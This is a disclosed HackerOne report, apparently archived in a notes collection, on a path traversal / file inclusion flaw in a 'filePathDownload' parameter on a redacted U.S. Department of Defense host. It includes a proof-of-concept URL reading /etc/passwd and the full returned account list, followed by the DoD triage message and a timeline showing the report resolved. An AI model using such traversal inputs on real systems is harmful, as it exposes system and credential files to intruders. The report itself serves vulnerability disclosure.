---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2022-04-29
submitted: 2022-04-16T17:14:07.440Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "exploitmsf"
source: "https://hackerone.com/reports/1542734"
title: "lfi in filePathDownload parameter via ███████"
---
# lfi in filePathDownload parameter via ███████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 10 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-04-29

- Report: [https://hackerone.com/reports/1542734](https://hackerone.com/reports/1542734)
- CWE: Path Traversal
- Submitted: 2022-04-16T17:14:07.440Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

hi i found critcal lfi vulnerability 
poc: https://█████████/████████=/etc/passwd
response: 
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:998:995::/var/lib/chrony:/sbin/nologin
ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
sssd:x:995:993:User for sssd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sustainment:x:1001:1001::/home/sustainment:/bin/bash
emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash
cwagent:x:993:992::/home/cwagent:/bin/bash
ssm-user:x:1003:1004::/home/ssm-user:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
drupal:x:1004:1005::/home/drupal:/bin/bash
splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash
mfe:x:992:1007::/home/mfe:/sbin/nologin
```

## Impact

attacker can read any file in system

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
all poc in Description

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2022-04-16** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
